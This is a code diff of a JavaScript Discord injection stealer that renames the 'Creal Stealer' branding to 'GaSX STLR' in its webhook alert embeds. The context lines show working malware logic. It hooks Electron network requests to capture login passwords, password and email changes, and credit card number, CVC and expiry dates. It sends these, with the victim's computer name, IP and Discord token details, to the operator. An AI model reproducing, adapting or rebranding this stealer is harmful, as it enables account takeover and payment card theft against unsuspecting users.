@@ -68,7 +68,7 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Creal Stealer",
+        username: "GaSX STLR",
         avatar_url: "https://raw.githubusercontent.com/Re-Edit/papa/main/scr.jpg",
         content: "",
         embeds: [{
@@ -77,7 +77,7 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Creal Stealer`
+                name: `GaSX STLR`
             },
             
             footer: {
@@ -302,7 +302,7 @@ const FirstTime = async () => {
     var client_discord = appName
     if (!token) {
         var params = await makeEmbed({
-            title: "Creal Stealer Initialized",
+            title: "GaSX STLR Initialized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
@@ -323,7 +323,7 @@ const FirstTime = async () => {
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: " Creal Stealer Initialized",
+            title: " GaSX STLR Initialized",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
             fields: [{
                 name: "Username <:username:1041634536733290596> ",
@@ -355,7 +355,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                value: `[GaSX STLR <a:mavikirmizi:853238372591599617>]`,
                 inline: !0
             }, {
                 name: "Creal Files",
@@ -416,7 +416,7 @@ const FirstTime = async () => {
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Creal Stealer Victim got logged out",
+                title: "GaSX STLR Victim got logged out",
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
                     name: "Username <:username:1041634536733290596> ",
@@ -448,7 +448,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Creal Stealer  <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[GaSX STLR  <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
                     inline: !0
                 }, {
                     name: "Creal Files",
@@ -601,7 +601,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "Creal Stealer User Login",
+                title: "GaSX STLR User Login",
                 color: config['embed-color'],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
@@ -634,7 +634,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[GaSX STLR <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
                     inline: !0
                 }, {
                     name: "Creal Files",
@@ -686,7 +686,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Creal Stealer Detect Password Changed",
+                    title: "GaSX STLR Detect Password Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -719,7 +719,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[GaSX STLR <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
                         inline: !0
                     }, {
                         name: "Creal Files",
@@ -773,7 +773,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Creal Stealer Detect Email Changed",
+                    title: "GaSX STLR Detect Email Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -806,7 +806,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[GaSX STLR <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
                         inline: !0
                     }, {
                         name: "Creal Files",
@@ -859,7 +859,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
     
                 var params = await makeEmbed({
-                    title: "Creal Stealer User Credit Card Added",
+                    title: "GaSX STLR User Credit Card Added",
                     color: config['embed-color'],
                     fields: [
                       { name: "Creal Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
